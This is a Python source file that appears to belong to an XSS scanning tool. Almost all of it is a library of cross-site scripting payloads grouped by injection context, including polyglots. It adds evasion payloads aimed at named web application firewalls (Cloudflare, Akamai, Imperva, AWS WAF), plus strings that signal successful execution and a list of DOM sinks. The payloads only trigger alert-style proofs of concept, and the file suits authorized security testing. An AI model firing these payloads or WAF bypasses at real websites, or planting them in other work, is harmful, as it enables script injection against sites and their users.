"""
Payload libraries for different contexts
Context-aware payloads for maximum accuracy and minimal false positives
"""

# Default payloads categorized by injection context
DEFAULT_PAYLOADS = {
    'script': [
        # Direct script execution
        '</script><script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>confirm(1)</script>',
        '<script>prompt(1)</script>',
        '<script>alert(document.domain)</script>',
        # Template literal injection
        '${alert(1)}',
        '{{alert(1)}}',
    ],
    
    'html': [
        # HTML injection with event handlers
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror="alert(1)">',
    ],
    
    'attribute': [
        # Breaking out of attributes
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" autofocus onfocus="alert(1)',
        "' autofocus onfocus='alert(1)",
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        # Without quotes
        ' onmouseover=alert(1) ',
        ' onfocus=alert(1) autofocus ',
    ],
    
    'url': [
        # JavaScript protocol
        'javascript:alert(1)',
        'javascript:alert(String.fromCharCode(88,83,83))',
        'javascript:void(alert(1))',
        # Data URI
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        # Vbscript (IE legacy)
        'vbscript:msgbox(1)',
    ],
    
    'style': [
        # CSS injection
        '</style><script>alert(1)</script>',
        '"><style>@import"javascript:alert(1)";</style>',
        'expression(alert(1))',  # IE legacy
        '-moz-binding:url("data:text/xml;charset=utf-8,<binding><implementation><constructor>alert(1)</constructor></implementation></binding>")',
    ],
    
    'generic': [
        # Polyglot payloads (work in multiple contexts)
        'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>',
        '\'">><marquee><img src=x onerror=confirm(1)></marquee>" onmouseover=prompt(1)>',
        '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
        '<iframe src=javascript:alert(1)>',
        '<svg><script>alert(1)</script></svg>',
    ]
}

# WAF-specific bypass payloads
WAF_BYPASS_PAYLOADS = {
    'cloudflare': {
        'script': [
            # Case variation
            '<ScRiPt>alert(1)</sCrIpT>',
            # Null byte injection
            '<script\x00>alert(1)</script>',
            # Unicode
            '<script>alert\u0028 1\u0029</script>',
            # HTML entities
            '&lt;script&gt;alert(1)&lt;/script&gt;',
        ],
        'html': [
            '<img src=x onerror=\u0061lert(1)>',
            '<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>',
            '<img src=x:alert(alt) onerror=eval(src) alt=1>',
        ]
    },
    
    'akamai': {
        'script': [
            # Whitespace evasion
            '<script\n>alert(1)</script>',
            '<script\t>alert(1)</script>',
            # Comment injection
            '<script><!--*/alert(1)//--></script>',
        ],
        'html': [
            '<img src=x onerror="al\u0065rt(1)">',
            '<svg><script>alert&#40;1&#41;</script></svg>',
        ]
    },
    
    'imperva': {
        'script': [
            # Encoding evasion
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
        ],
        'html': [
            '<img/src=x/onerror=alert(1)>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        ]
    },
    
    'aws_waf': {
        'script': [
            # Fragmentation
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            # Mixed case
            '<sCrIpT>alert(1)</sCrIpT>',
        ],
        'html': [
            '<img src=x onerror=alert`1`>',
            '<svg/onload=alert(1)//src=x>',
        ]
    }
}

# High-confidence indicators of successful XSS execution
EXECUTION_INDICATORS = [
    'alert(',
    'confirm(',
    'prompt(',
    'document.cookie',
    'document.domain',
    'window.location',
    'eval(',
    'setTimeout(',
    'setInterval(',
    'Function(',
    'document.write(',
    'innerHTML',
    'outerHTML',
]

# DOM-based XSS sinks
DOM_SINKS = [
    'innerHTML',
    'outerHTML',
    'document.write',
    'document.writeln',
    'eval',
    'setTimeout',
    'setInterval',
    'Function',
    'location',
    'location.href',
    'location.replace',
    'location.assign',
]